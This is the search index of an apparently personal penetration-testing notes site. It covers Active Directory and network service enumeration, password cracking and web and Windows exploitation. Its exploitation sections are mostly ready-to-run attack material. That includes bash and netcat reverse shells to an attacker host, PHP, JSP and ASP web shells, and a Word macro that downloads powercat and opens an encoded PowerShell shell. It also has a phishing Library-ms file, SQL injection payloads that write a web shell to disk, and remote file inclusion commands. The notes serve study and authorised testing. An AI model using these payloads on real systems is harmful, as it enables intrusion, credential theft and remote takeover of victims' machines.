{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"index","text":""},{"location":"#about-me","title":"About Me","text":""},{"location":"#writups","title":"Writups","text":""},{"location":"#broker","title":"broker","text":"<p>#Linux #ActiveMQ #sudoers #nginx</p>"},{"location":"#active","title":"Active","text":"<p>#easy #Active_Directory #kerberoasting #Windows</p>"},{"location":"about/","title":"About","text":"<p>I am a Senior Information Security Engineer with experience running IR exercises, Appsec, EDR, SIEM, Incident Response, light Reverse Engineering and Exploit Development.</p> <p>At one point I was the Linux System Administrator for 35 RHEL Linux servers, two Elasticsearch clusters, Graylog and Moloch(now rebranded as Arkime) and I do a little of everything these days.</p>"},{"location":"about/#certs","title":"Certs","text":"<p>OSCP GPEN</p>"},{"location":"about/#my-setup","title":"My Setup","text":"<p>I use obsidian.md for note taking, Windows for the host, and BlackArch or Kali guests for attacking.</p> <p>My homelab consists of</p> <ul> <li> <p>hp DL360 server and a Cisco Catalyst 3750 48 port switch, currently offline</p> </li> <li> <p>Windows, Kali, ParrotOS, and BlackArch VMs in vmware player workstation with Windows host</p> </li> </ul> <p>Retro Computing</p> <ul> <li> <p>TI Insight Series 10 terminals-wiki powers on, crt not working</p> </li> <li> <p>3 windows 98 desktops</p> </li> <li> <p>~10 windows xp systems</p> </li> <li> <p>3 commodore 128s(one working two in need of repair)</p> </li> </ul>"},{"location":"about/#these-notes","title":"These Notes","text":"<p>I am using mkdocs with the mkdocs-material theme hosted on github-pages </p> <p>Internal links are used where a topic can logically fit in two different places</p> <p>I may change the site at some point to something that has more flexibility but I keep notes in obsidian.md which this makes extremely simple to maintain</p>"},{"location":"about/#projects","title":"Projects","text":"<p>The windows 98 systems are in the process of being set up for a retro LAN party, the main one I use has a 1 GHz PIII, 512 MB ram, Voodoo 3500</p>"},{"location":"about/#other-interests","title":"Other Interests","text":"<p>I am a licensed glider pilot, licensed falconer and photographer, you can find some photographs here but it is a very limited selection; I am undecided on how best to handle AI as I would prefer none of my photos were used to train a machine learning algorithm.</p>"},{"location":"ENUMERATION/AD/","title":"AD","text":""},{"location":"ENUMERATION/AD/#bloodhound","title":"bloodhound","text":"<pre><code>run sharphound.ps1 or .exe on systems you can\npowershell -ep bypass\nImport-Module .\\Sharphound.ps1\nInvoke-BloodHound -CollectionMethod All -OutputDirectory C:\\Users\\[user]\\Desktop\\ -OutputPrefix \"domain audit\"\n</code></pre>"},{"location":"ENUMERATION/AD/#users_and_groups","title":"users_and_groups","text":"<pre><code>net user /domain\nnet group /domain\n\nnet group [group] /domain #shows group members\n\nGet-NetSession -ComputerName [hostname] # check for logged in users\n# ENUM\n\n.\\PsLoggedon.exe \\\\[hostname] #check for logged on users\n</code></pre>"},{"location":"ENUMERATION/AD/#ldap","title":"LDAP","text":"<pre><code># format\nLDAP://HostName[:PortNumber][/DistinguishedName]\n\n# get PDC\n[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()\n\n# nmap scripts\nnmap -n -sV --script \"ldap* and not brute\" [IP]\n\n# ldapesearch\nldapsearch -H ldaps://[host]:636/ -x -s base -b '' \"(objectClass=*)\" \"*\" +\n</code></pre>"},{"location":"ENUMERATION/AD/#troubleshoot","title":"troubleshoot","text":"<pre><code># check query level NetSessionEnum\nGet-Acl -Path HKLM:SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\DefaultSecurity\\ | fl\n</code></pre>"},{"location":"ENUMERATION/AD/#spns","title":"SPNs","text":"<pre><code>setspn -L iis_service\nsetspn -T pentestlab -Q */*\n\n# DEPENDS ON POWERVIEW IMPORT MODULE\n\nGet-NetUser -SPN | select samaccountname,serviceprincipalname\n</code></pre>"},{"location":"ENUMERATION/AD/#powerview","title":"powerview","text":"<pre><code>powershell -ep bypass\n\nImport-Module .\\PowerView.ps1\nGet-NetDomain\n\nGet-NetUser\nGet-NetUser | select cn\nGet-NetUser | select cn,pwdlastset,lastlogon\n\nGet-NetGroup | select cn\nGet-NetGroup \"Sales Department\" | select member\n</code></pre>"},{"location":"ENUMERATION/AD/#operating_systems","title":"operating_systems","text":"<pre><code># DEPENDS ON POWERVIEW IMPORT MODULE\n\nGet-NetComputer\nGet-NetComputer | select dnshostname,operatingsystem,operatingsystemversion\n</code></pre>"},{"location":"ENUMERATION/AD/#enum_permissions","title":"enum_permissions","text":"<pre><code># DEPENDS ON POWERVIEW IMPORT MODULE\n\nFind-LocalAdminAccess # search for hosts current user has local admin on\n</code></pre>"},{"location":"ENUMERATION/AD/#object_permissions","title":"Object_permissions","text":"<pre><code>interesting permissions\n\nGenericAll: Full permissions on object\nGenericWrite: Edit certain attributes on the object\nWriteOwner: Change ownership of the object\nWriteDACL: Edit ACE's applied to object\nAllExtendedRights: Change password, reset password, etc.\nForceChangePassword: Password change for object\nSelf (Self-Membership): Add ourselves to for example a group\n\n# DEPENDS ON POWERVIEW IMPORT MODULE\nGet-ObjectAcl -Identity stephanie\nConvert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104\nConvert-NameToSid\n\nwe are interested in the ActiveDirectoryRights and SecurityIdentifier for each object we enumerate\n\nGet-ObjectAcl -Identity \"Management Department\" | ? {$_.ActiveDirectoryRights -eq \"GenericAll\"} | select SecurityIdentifier,ActiveDirectoryRights\n\nGet-ObjectAcl | ? {$_.SecurityIdentifier -eq \"[pwned SID]\"}\n\nConvert-SidToName [output]\n</code></pre>"},{"location":"ENUMERATION/AD/#abuse_object_permissions","title":"abuse_object_permissions","text":"<pre><code>generic all\nnet group \"Management Department\" stephanie /add /domain\n</code></pre>"},{"location":"ENUMERATION/AD/#domain_shares","title":"Domain_shares","text":"<pre><code># DEPENDS ON POWERVIEW IMPORT MODULE\nFind-DomainShare\n\nSYSVOL - every user has access by default\nls \\\\dc1.corp.com\\sysvol\\corp.com\\ #change \"corp.com\" to domain and \"dc1...\" to DC\n\n# ls directories\nls \\\\dc1.corp.com\\sysvol\\corp.com\\Policies\\\n\n# cat interesting files\ncat \\\\dc1.corp.com\\sysvol\\corp.com\\Policies\\oldpolicy\\old-policy-backup.xml\n</code></pre>"},{"location":"ENUMERATION/AD/#gpp_passwords","title":"GPP_passwords","text":"<pre><code>passwords in group policy preferences can be decrypted with the leaked AES-256 key\ngpp-decrypt \"+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE\"\n</code></pre>"},{"location":"ENUMERATION/AD/#rpc","title":"RPC","text":"<pre><code>rpcclient -N -U \"\" [host]\n</code></pre>"},{"location":"ENUMERATION/AD/#smb","title":"SMB","text":"<pre><code>smbmap -u \"\" -p \"\" -P 445 -H [DC IP] &amp;&amp; smbmap -u \"guest\" -p \"\" -P 445 -H [DC IP]\n</code></pre>"},{"location":"ENUMERATION/GENERAL/GIT/","title":"GIT","text":"<pre><code>git status\ngit log\ngit show\n</code></pre>"},{"location":"ENUMERATION/GENERAL/IMAP/","title":"IMAP","text":""},{"location":"ENUMERATION/GENERAL/IMAP/#nmap","title":"nmap","text":"<pre><code>nmap -p143 --script imap-ntlm-info [ip]\n</code></pre>"},{"location":"ENUMERATION/GENERAL/IMAP/#connect","title":"connect","text":"<pre><code>telnet [ip] 143\n</code></pre>"},{"location":"ENUMERATION/GENERAL/METADATA/","title":"METADATA","text":""},{"location":"ENUMERATION/GENERAL/METADATA/#exiftool","title":"exiftool","text":"<pre><code>exiftool -a -u [file]\n-a include duplicates\n-u display unknown tags\n</code></pre>"},{"location":"ENUMERATION/GENERAL/POP/","title":"POP","text":""},{"location":"ENUMERATION/GENERAL/POP/#nmap","title":"nmap","text":"<pre><code>nmap --script \"pop3-capabilities or pop3-ntlm-info\" -sV -port [PORT] [IP]\n</code></pre>"},{"location":"ENUMERATION/GENERAL/PORT%20SCAN/","title":"PORT SCAN","text":""},{"location":"ENUMERATION/GENERAL/PORT%20SCAN/#masscan","title":"masscan","text":"<pre><code># scan all TCP / UDP ports\n# use with caution; very noisy and can impact performance of site\nmasscan -p1-65535,U:1-65535 [ip] --rate=1000 -e tun0\n</code></pre>"},{"location":"ENUMERATION/GENERAL/PORT%20SCAN/#nmap","title":"nmap","text":"<pre><code># default scan I generally use\n# default scripts, version detection\nnmap -sC -sV [ip]\n\n# helpful flags\n-t[1-5]: scan faster / slower, defaul = 3\n-sT: tcp scan(default)\n-sU: udp scan\n--top-ports [number]: scans most frequently used [number] of udp/tcp ports\n-A: aggressive scan, enables os detection, version scanning, default scripts, and traceroute\n</code></pre>"},{"location":"ENUMERATION/GENERAL/SMB%20-%20SAMBA/","title":"SMB - SAMBA","text":""},{"location":"ENUMERATION/GENERAL/SMB%20-%20SAMBA/#nmap","title":"nmap","text":"<pre><code>nmap --script \"smb* and not brute\" -p 445 [ip]\n</code></pre>"},{"location":"ENUMERATION/GENERAL/SMB%20-%20SAMBA/#enum4linux","title":"enum4linux","text":"<pre><code>enum4linux -a [ip]\n</code></pre>"},{"location":"ENUMERATION/GENERAL/SMB%20-%20SAMBA/#smbclient","title":"smbclient","text":"<pre><code>smbclient -L \\\\[ip]\nsmbclient \\\\[ip]\\share\n</code></pre>"},{"location":"ENUMERATION/GENERAL/SMB%20-%20SAMBA/#nbtscan","title":"nbtscan","text":"<pre><code>valid NetBIOS names\nsudo nbtscan -r 192.168.50.0/24\n</code></pre>"},{"location":"ENUMERATION/GENERAL/SMB%20-%20SAMBA/#windows_enum","title":"windows_enum","text":"<pre><code>list all shares\nnet view \\\\[hostname] /all\n</code></pre>"},{"location":"ENUMERATION/GENERAL/SMTP/","title":"SMTP","text":"<p>https://book.hacktricks.xyz/network-services-pentesting/pentesting-smtp</p>"},{"location":"ENUMERATION/GENERAL/SMTP/#nmap","title":"nmap","text":"<pre><code>nmap -p25 --script smtp-commands [ip]\nnmap -p25 --script smtp-open-relay [ip] -v\n</code></pre>"},{"location":"ENUMERATION/GENERAL/SMTP/#ntlm_auth_information_disclosure","title":"NTLM_auth_information_disclosure","text":"<p>https://medium.com/swlh/internal-information-disclosure-using-hidden-ntlm-authentication-18de17675666`</p> <pre><code>telnet example.com 587\n</code></pre>"},{"location":"ENUMERATION/GENERAL/SMTP/#connect","title":"connect","text":"<pre><code>telnet [ip] 25\n</code></pre>"},{"location":"ENUMERATION/GENERAL/SMTP/#commands","title":"commands","text":"<pre><code>ehlo var - first command on connection, handshake + show extended information\nhelo var - same but less info\n</code></pre>"},{"location":"ENUMERATION/GENERAL/SMTP/#verify_username_exists","title":"verify_username_exists","text":"<pre><code>MAIL FROM:test@test.org\nRCPT TO:admin\n\nVRFY admin\n</code></pre>"},{"location":"ENUMERATION/GENERAL/SMTP/#autocomplete_for_server_domain","title":"autocomplete_for_server_domain","text":"<pre><code>MAIL FROM: me\n250 2.1.0 me@PRODSERV01.somedomain.com....Sender OK250 2.1.0 me@PRODSERV01.somedomain.com....Sender OK\n</code></pre>"},{"location":"ENUMERATION/GENERAL/SNMP/","title":"SNMP","text":""},{"location":"ENUMERATION/GENERAL/SNMP/#nmap","title":"nmap","text":"<pre><code>sudo nmap -sU --open -p 161 192.168.50.1-254 -oG open-snmp.txt\n</code></pre>"},{"location":"ENUMERATION/GENERAL/SNMP/#onesixtyone","title":"onesixtyone","text":"<pre><code>echo public &gt; community\necho private &gt;&gt; community\necho manager &gt;&gt; community\nfor ip in $(seq 1 254); do echo 192.168.50.$ip; done &gt; ips\nonesixtyone -c community -i ips\n</code></pre>"},{"location":"ENUMERATION/GENERAL/SNMP/#enum_mib","title":"ENUM_mib","text":"<pre><code>snmpwalk -c public -v1 -t 10 192.168.50.151\n-c community string(usually public)\n-v snmp version number\n-t timeout(seconds)\n\nsnmpwalk -c public -v1 192.168.50.151 [MIB sub-tree]\n1.3.6.1.4.1.77.1.2.25 local users\n1.3.6.1.2.1.25.4.2.1.2 running processes\n1.3.6.1.2.1.25.6.3.1.2 installed software\n1.3.6.1.2.1.6.13.1.3 listening TCP ports\n</code></pre>"},{"location":"ENUMERATION/GENERAL/SQL/","title":"SQL","text":""},{"location":"ENUMERATION/GENERAL/SQL/#mysql","title":"mysql","text":"<pre><code>mysql -u root -p'root' -h 192.168.50.16 -P 3306\nselect version();\nselect system_user();\nshow databases;\nSELECT user, authentication_string FROM mysql.user WHERE user = '[user]';\n</code></pre>"},{"location":"ENUMERATION/GENERAL/SQL/#mssql","title":"mssql","text":"<pre><code>impacket-mssqlclient [username]:[password]@[ip] -windows-auth\nSELECT @@version;\nSELECT name FROM sys.databases;\nSELECT name FROM sys.objects WHERE type = 'U';\nSELECT * FROM [database].information_schema.tables;\nselect * from [database].dbo.users;\n</code></pre> <p>master.dbo.sysusers table is a default table in older versions of MSSQL</p>"},{"location":"ENUMERATION/GENERAL/SSH/","title":"SSH","text":""},{"location":"ENUMERATION/GENERAL/SSH/#ssh-audit","title":"ssh-audit","text":"<pre><code>usage: ssh-audit.py [-1246pbcnjvlt] &lt;host&gt;\n\n   -1,  --ssh1             force ssh version 1 only\n   -2,  --ssh2             force ssh version 2 only\n   -4,  --ipv4             enable IPv4 (order of precedence)\n   -6,  --ipv6             enable IPv6 (order of precedence)\n   -p,  --port=&lt;port&gt;      port to connect\n   -b,  --batch            batch output\n   -c,  --client-audit     starts a server on port 2222 to audit client\n                               software config (use -p to change port;\n                               use -t to change timeout)\n   -n,  --no-colors        disable colors\n   -j,  --json             JSON output\n   -v,  --verbose          verbose output\n   -l,  --level=&lt;level&gt;    minimum output level (info|warn|fail)\n   -t,  --timeout=&lt;secs&gt;   timeout (in seconds) for connection and reading\n                               (default: 5)\n$ python3 ssh-audit &lt;IP&gt;\n</code></pre>"},{"location":"ENUMERATION/GENERAL/VULNERABILITIES/","title":"VULNERABILITIES","text":""},{"location":"ENUMERATION/GENERAL/VULNERABILITIES/#nmap","title":"nmap","text":"<pre><code>sudo nmap -sV --script \"vuln\" [ip]\n-sV is very important, service detection allows nmap to scan relevant vulns\n</code></pre>"},{"location":"ENUMERATION/GENERAL/VULNERABILITIES/#add_custom_nse","title":"add_custom_nse","text":"<pre><code>search google: CVE... nse\ndownload nse to /usr/share/nmap/scripts/ and rename to follow nmap naming convention\nsudo nmap --script-updatedb\nready to use!\n</code></pre>"},{"location":"ENUMERATION/GENERAL/WEB/","title":"WEB","text":""},{"location":"ENUMERATION/GENERAL/WEB/#enum","title":"enum","text":"<pre><code>nikto -h [ip]\n</code></pre>"},{"location":"ENUMERATION/GENERAL/WEB/#uri_enum","title":"URI_enum","text":"<pre><code>feroxbuster --url [url]\ndirbuster\nffuf\ngobuster\nwpscan\n</code></pre>"},{"location":"ENUMERATION/GENERAL/WEB/#sub-domain_enum","title":"sub-domain_enum","text":"<pre><code>ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://[hostname] -H \"HOST:FUZZ.[hostname]\"\n</code></pre>"},{"location":"ENUMERATION/GENERAL/WEB/#whatweb","title":"whatweb","text":"<pre><code>whatweb http://[ip/host]:[port]\n</code></pre>"},{"location":"ENUMERATION/GENERAL/WEB/#gobuster_detail","title":"gobuster_detail","text":"<pre><code>gobuster dir -u http://[ip/host] -w /usr/share/wordlists/dirb/common.txt -o mailsrv1/gobuster -x txt,pdf,config\n\n-u url\n-w wordlist\n-o output file\n-x filetype to enumerate\n</code></pre>"},{"location":"ENUMERATION/GENERAL/WEB/#wpscan_detail","title":"wpscan_detail","text":"<pre><code>#aggressive scan without token\nwpscan --url http://[ip/host] --enumerate p --plugins-detection aggressive -o websrv1/wpscan\n</code></pre>"},{"location":"ENUMERATION/OS/LINUX/","title":"LINUX","text":""},{"location":"ENUMERATION/OS/LINUX/#local_enum","title":"local_enum","text":""},{"location":"ENUMERATION/OS/LINUX/#whoami","title":"whoami","text":"<pre><code>id\n</code></pre>"},{"location":"ENUMERATION/OS/LINUX/#distribution","title":"distribution","text":"<pre><code>cat /etc/issue\ncat /etc/*release\n</code></pre>"},{"location":"ENUMERATION/OS/LINUX/#kernel","title":"kernel","text":"<pre><code>uname -a\ncat /proc/version\n</code></pre>"},{"location":"ENUMERATION/OS/LINUX/#environment_variables","title":"environment_variables","text":"<pre><code>env\nset\ncat /etc/profile\ncat /etc/bashrc\ncat ~/.bash_profile\ncat ~/.bashrc\ncat ~/.bash_logout\ncat ~/.zshrc\n</code></pre>"},{"location":"ENUMERATION/OS/LINUX/#ssh","title":"ssh","text":"<pre><code>DSA\n\n~/.ssh/id_dsa.pub\n~/.ssh/id_dsa\n\nRSA\n\n~/.ssh/id_rsa.pub\n~/.ssh/id_rsa\n\nECDSA\n\n~/.ssh/id_ecdsa.pub\n~/.ssh/id_ecdsa\n\nEd25519 (Edwards-curve DSA)\n\n~/.ssh/id_ed25519.pub\n~/.ssh/id_ed25519\n</code></pre>"},{"location":"ENUMERATION/OS/LINUX/#crack","title":"crack","text":"<pre><code>ssh2john.py id_rsa &gt; id_rsa.hash\njohn id_rsa.hash\n</code></pre>"},{"location":"ENUMERATION/OS/WINDOWS/","title":"WINDOWS","text":""},{"location":"ENUMERATION/OS/WINDOWS/#local_enum","title":"local_enum","text":""},{"location":"ENUMERATION/OS/WINDOWS/#whoami","title":"whoami","text":"<pre><code># get all info on current user, group membership, etc\nwhoami /all\n    /groups: just group membership\n</code></pre>"},{"location":"EXPLOITATION/PASSWORD%20ATTACKS/","title":"PASSWORD ATTACKS","text":""},{"location":"EXPLOITATION/PASSWORD%20ATTACKS/#ssh","title":"ssh","text":"<pre><code>sudo hydra -l [user] -P /usr/share/wordlists/rockyou.txt -s [port] ssh://[ip]\n\nsudo hydra -L /usr/share/wordlists/dirb/others/names.txt -p \"[password]\" rdp://[ip]\n</code></pre>"},{"location":"EXPLOITATION/PASSWORD%20ATTACKS/#http_post","title":"http_post","text":"<pre><code>sudo hydra -l [user] -P /usr/share/wordlists/rockyou.txt [ip] http-post-form \"/index.php:fm_usr=[user]&amp;fm_pwd=^PASS^:Login failed. Invalid\"\n</code></pre>"},{"location":"EXPLOITATION/PASSWORD%20ATTACKS/#http_get","title":"http_get","text":"<pre><code>hydra -l admin -P /usr/share/wordlists/rockyou.txt -s [port] -f [ip] http-get -V\n</code></pre>"},{"location":"EXPLOITATION/PASSWORD%20ATTACKS/#identify_hash","title":"identify_hash","text":"<pre><code>identifier\nhashid\n</code></pre>"},{"location":"EXPLOITATION/PASSWORD%20ATTACKS/#password_search","title":"password_search","text":"<p>[[PRIVILEGE ESCALATION/OS/WINDOWS/ENUM|ENUM]]</p> <pre><code>Get-ChildItem -Path C:\\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue\n</code></pre>"},{"location":"EXPLOITATION/PASSWORD%20ATTACKS/#ssh_key","title":"ssh_key","text":"<pre><code>ssh2john id_rsa &gt; ssh.hash\n\n</code></pre>"},{"location":"EXPLOITATION/PASSWORD%20ATTACKS/#jtr_rules","title":"jtr_rules","text":"<pre><code>add name and append to /etc/john/john.conf\n\ncat ssh.rule\n[List.Rules:sshRules]\nc $1 $3 $7 $!\n\nsudo sh -c 'cat /home/kali/passwordattacks/ssh.rule &gt;&gt; /etc/john/john.conf'\n\njohn --wordlist=ssh.passwords --rules=sshRules ssh.hash\n</code></pre>"},{"location":"EXPLOITATION/POST%20EXPLOITATION/","title":"POST EXPLOITATION","text":"<pre><code>run enum scripts again, with more access may find other passwords/files\nmimikatz to pillage passwords/tickets\nPTT/PTH/OPTH?\npivot\ncheck network interfaces\n</code></pre>"},{"location":"EXPLOITATION/OS/LINUX/REVERSE%20SHELL/","title":"REVERSE SHELL","text":""},{"location":"EXPLOITATION/OS/LINUX/REVERSE%20SHELL/#bash","title":"bash","text":"<pre><code>/bin/bash -i &gt;&amp; /dev/tcp/[ip]]/[host] 0&gt;&amp;1 &amp;\n\nforce bash\n/bin/bash -c '/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.76/9999 0&gt;&amp;1 &amp;'\n\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc [attacker ip] [attacker port] &gt;/tmp/f\n\n&lt;?php system (\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc [attacker ip] [attacker port] &gt;/tmp/f\"); ?&gt;\n</code></pre>"},{"location":"EXPLOITATION/OS/LINUX/REVERSE%20SHELL/#msfvenom","title":"msfvenom","text":"<pre><code>msfvenom -p linux/x86/shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f elf &gt; shell-x86.elf\n</code></pre>"},{"location":"EXPLOITATION/OS/WINDOWS/REVERSE%20SHELL/","title":"REVERSE SHELL","text":"<p>[[LATERAL MOVEMENT/AD/REVERSE SHELL|REVERSE SHELL]] </p>"},{"location":"EXPLOITATION/OS/WINDOWS/PHISH/EMAIL/","title":"EMAIL","text":""},{"location":"EXPLOITATION/OS/WINDOWS/PHISH/EMAIL/#swaks","title":"swaks","text":"<pre><code>sudo swaks -t [recipient1]@[domain] -t [recipient2]@[domain] --from [sender]@[domain] --attach @config.Library-ms --server [email server ip] --body @body.txt --header \"Subject: Staging Script\" --suppress-data -ap\n</code></pre>"},{"location":"EXPLOITATION/OS/WINDOWS/PHISH/LIBRARY%20FILES/","title":"LIBRARY FILES","text":"<pre><code>/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/\n</code></pre> <p>start visual studio create file on desktop <code>config.Library-ms</code> this will show as an icon example of contents, change as needed</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;libraryDescription xmlns=\"http://schemas.microsoft.com/windows/2009/library\"&gt;\n&lt;name&gt;@windows.storage.dll,-34582&lt;/name&gt;\n&lt;version&gt;6&lt;/version&gt;\n&lt;isLibraryPinned&gt;true&lt;/isLibraryPinned&gt;\n&lt;iconReference&gt;imageres.dll,-1003&lt;/iconReference&gt;\n&lt;templateInfo&gt;\n&lt;folderType&gt;{7d49d726-3c21-4f05-99aa-fdc2c9474656}&lt;/folderType&gt;\n&lt;/templateInfo&gt;\n&lt;searchConnectorDescriptionList&gt;\n&lt;searchConnectorDescription&gt;\n&lt;isDefaultSaveLocation&gt;true&lt;/isDefaultSaveLocation&gt;\n&lt;isSupported&gt;false&lt;/isSupported&gt;\n&lt;simpleLocation&gt;\n&lt;url&gt;http://[attacker ip]&lt;/url&gt;\n&lt;/simpleLocation&gt;\n&lt;/searchConnectorDescription&gt;\n&lt;/searchConnectorDescriptionList&gt;\n&lt;/libraryDescription&gt;\n</code></pre> <p>right click on windows desktop and create shortcut, use [[LATERAL MOVEMENT/AD/REVERSE SHELL|REVERSE SHELL]] as location of the item. select automatic_configuration as name for shortcut file and click finished</p>"},{"location":"EXPLOITATION/OS/WINDOWS/PHISH/MACROS/","title":"MACROS","text":"<pre><code>Sub AutoOpen()\n\n  MyMacro\n\nEnd Sub\n\nSub Document_Open()\n\n  MyMacro\n\nEnd Sub\n\nSub MyMacro()\n\n  CreateObject(\"Wscript.Shell\").Run \"powershell\"\n\nEnd Sub\n</code></pre> <p>base64 encode powercat must be split into smaller chunks as there is a 255 char limit, this limit does not apply to vars, concat strings with python</p> <p>encode in powershell / pwsh</p> <pre><code>#powershell \n\n$text = 'IEX(New-Object System.Net.WebClient).DownloadString(\"http://[attacker ip]:[attacker http server port]/powercat.ps1\");powercat -c [attacker ip] -p [attacker shell listening port] -e powershell'\n\n$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text) \n\n$EncodedText =[Convert]::ToBase64String($Bytes)\n\n$EncodedText\n</code></pre> <pre><code>#python script to split up string, must have no linebreaks\nstr = \"powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA...\"\n\nn = 50\n\nfor i in range(0, len(str), n):\n    print(\"Str = Str + \" + '\"' + str[i:i+n] + '\"')\n</code></pre> <p>final payload</p> <pre><code>Sub AutoOpen()\n    MyMacro\nEnd Sub\n\nSub Document_Open()\n    MyMacro\nEnd Sub\n\nSub MyMacro()\n    Dim Str As String\n\n    Str = Str + \"powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU\"\n        Str = Str + \"AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd\"\n        Str = Str + \"AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB\"\n    ...\n        Str = Str + \"wAgADEAOQAyAC4AMQA2ADgALgA1ADAALgAxADEAMQAgAC0AcAA\"\n        Str = Str + \"gADkAOQA5ADkAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA\"\n        Str = Str + \"A== \"\n\n    CreateObject(\"Wscript.Shell\").Run Str\nEnd Sub\n</code></pre>"},{"location":"EXPLOITATION/WEB/FILE%20UPLOAD%20VULNERABILITIES/","title":"FILE UPLOAD VULNERABILITIES","text":""},{"location":"EXPLOITATION/WEB/FILE%20UPLOAD%20VULNERABILITIES/#filter_bypass","title":"filter_bypass","text":"<pre><code>rename to less common vewrsion\n\n.php -&gt; .phps .php7 .phtml\n\nchange case\n\n.php -&gt; .pHP\n</code></pre>"},{"location":"EXPLOITATION/WEB/LFI/","title":"LFI","text":"<pre><code>windows locations\nC:\\Windows\\System32\\drivers\\etc\\hosts\nC:\\inetpub\\logs\\LogFiles\\W3SVC1\\\nC:\\inetpub\\wwwroot\\web.config\n\nlog poisoning\nC:\\xampp\\apache\\logs\\access.log\n/var/log/apache2/access.log\n\ngrab ssh keys\n\nadd our ssh key to authorized_keys for a user\n</code></pre>"},{"location":"EXPLOITATION/WEB/OS%20INJECTION/","title":"OS INJECTION","text":""},{"location":"EXPLOITATION/WEB/OS%20INJECTION/#escapes","title":"escapes","text":"<pre><code>special chars\n\ninject in middle of string by esaping some\"command\"string\n\"&amp;[somecommand]\"\n\"+$([comand])\"\n\ncomment out end\n</code></pre>"},{"location":"EXPLOITATION/WEB/PHP%20WRAPPERS/","title":"PHP WRAPPERS","text":""},{"location":"EXPLOITATION/WEB/PHP%20WRAPPERS/#filter_to_avoid_execution","title":"filter_to_avoid_execution","text":"<pre><code>curl http://[site]/[location]/index.php?page=php://filter/resource=admin.php\n</code></pre>"},{"location":"EXPLOITATION/WEB/PHP%20WRAPPERS/#base64_encoding_to_get_hidden_content","title":"base64_encoding_to_get_hidden_content","text":"<pre><code>curl http://[site]/[location]/index.php?page=php://filter/convert.base64-encode/resource=admin.php\n\necho [base64] | base64 -d\n</code></pre>"},{"location":"EXPLOITATION/WEB/PHP%20WRAPPERS/#data_remote_code_execution","title":"data_remote_code_execution","text":"<pre><code>curl \"http://[site]/[location]/index.php?page=data://text/plain,&lt;?php%20echo%20system('ls');?&gt;\"\n</code></pre>"},{"location":"EXPLOITATION/WEB/PHP%20WRAPPERS/#base64_encoded_rce","title":"base64_encoded_rce","text":"<pre><code>echo -n '&lt;?php echo system($_GET[\"cmd\"]);?&gt;' | base64\n\ncurl \"http://[site]/[location]/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&amp;cmd=ls\"\n</code></pre>"},{"location":"EXPLOITATION/WEB/RFI/","title":"RFI","text":"<pre><code>curl \"http://[site]/[location]/index.php?page=http://[attacker http site]/simple-backdoor.php&amp;cmd=ls\"\n</code></pre>"},{"location":"EXPLOITATION/WEB/SHELLS/","title":"SHELLS","text":"<pre><code>&lt;?php system($_REQUEST[\"cmd\"]); ?&gt;\n</code></pre> <pre><code>&lt;% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %&gt;\n</code></pre> <pre><code>&lt;% eval request(\"cmd\") %&gt;\n</code></pre> <pre><code>/bin/bash -c '/bin/bash -i &gt;&amp; /dev/tcp/[ip]/[port] 0&gt;&amp;1'\n</code></pre>"},{"location":"EXPLOITATION/WEB/SQLI/","title":"SQLI","text":""},{"location":"EXPLOITATION/WEB/SQLI/#comments","title":"comments","text":"<pre><code>comments\n--\n;--\n#\n;#\n</code></pre>"},{"location":"EXPLOITATION/WEB/SQLI/#error_based","title":"error_based","text":"<pre><code>simple auth bypass\nuser' OR 1=1 --\n\n' or 1=1 in (select @@version) --\n' OR 1=1 in (SELECT * FROM users) --\n' or 1=1 in (SELECT password FROM users) --\n' or 1=1 in (SELECT password FROM users WHERE username = 'admin') --\n</code></pre>"},{"location":"EXPLOITATION/WEB/SQLI/#union_based","title":"UNION_based","text":"<ul> <li>Same number of columns are being returned as the original query.</li> <li>Which columns returned from the original query are of a suitable data type to hold the results from the injected query.</li> </ul> <pre><code>get # of columns\niterate '1' until error\n' ORDER BY 1--\n\n%' UNION SELECT database(), user(), @@version, null, null --\n\nshift right if missing first entry, app probably not showing id col\n' UNION SELECT null, null, database(), user(), @@version  --\n\n' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() --\n\n' UNION SELECT null, username, password, description, null FROM users --\n</code></pre>"},{"location":"EXPLOITATION/WEB/SQLI/#blind","title":"blind","text":"<pre><code>test for boolean based\nhttp://192.168.50.16/blindsqli.php?user=admin' AND 1=1 --\n\ntest for time based\nhttp://192.168.50.16/blindsqli.php?user=admin' AND IF (1=1, sleep(30),'false') --\n</code></pre>"},{"location":"EXPLOITATION/WEB/SQLI/#xp_cmdshell","title":"xp_cmdshell","text":"<pre><code>enable\n\nEXECUTE sp_configure 'show advanced options', 1;\nRECONFIGURE;\nEXECUTE sp_configure 'xp_cmdshell', 1;\nRECONFIGURE;\n\nexploit\nEXECUTE xp_cmdshell 'whoami';\n</code></pre>"},{"location":"EXPLOITATION/WEB/SQLI/#write_webshell_on_disk","title":"write_webshell_on_disk","text":"<pre><code>' UNION SELECT \"&lt;?php system($_GET['cmd']);?&gt;\", null, null, null, null INTO OUTFILE \"/var/www/html/tmp/webshell.php\" --\n</code></pre> <p>further reading: 